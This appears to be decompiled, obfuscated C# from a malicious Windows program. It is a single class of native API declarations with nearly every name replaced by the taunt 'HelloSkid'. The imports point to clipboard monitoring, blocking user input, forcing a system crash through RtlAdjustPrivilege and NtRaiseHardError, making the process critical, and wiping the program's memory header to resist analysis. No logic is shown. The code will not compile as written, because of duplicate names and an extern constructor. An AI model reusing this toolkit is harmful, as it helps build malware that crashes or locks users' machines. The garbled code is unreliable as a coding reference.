using System;
using System.Runtime.InteropServices;

public class B0E38A56
{
	public const int HelloSkid = 797;

	public static IntPtr HelloSkid;

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool AddClipboardFormatListener(IntPtr HelloSkid);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr SetParent(IntPtr HelloSkid, IntPtr HelloSkid);

	[DllImport("user32.dll")]
	public static extern bool BlockInput(bool HelloSkid);

	[DllImport("ntdll.dll")]
	public static extern IntPtr RtlAdjustPrivilege(int HelloSkid, bool HelloSkid, bool HelloSkid, out bool HelloSkid);

	[DllImport("ntdll.dll")]
	public static extern IntPtr NtRaiseHardError(uint HelloSkid, uint HelloSkid, uint HelloSkid, IntPtr HelloSkid, uint HelloSkid, out uint HelloSkid);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string HelloSkid);

	[DllImport("kernel32.dll")]
	public static extern IntPtr ZeroMemory(IntPtr HelloSkid, IntPtr HelloSkid);

	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualProtect(IntPtr HelloSkid, IntPtr HelloSkid, IntPtr HelloSkid, ref IntPtr HelloSkid);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(IntPtr HelloSkid, int HelloSkid, ref int HelloSkid, int HelloSkid);

	public extern B0E38A56();
}
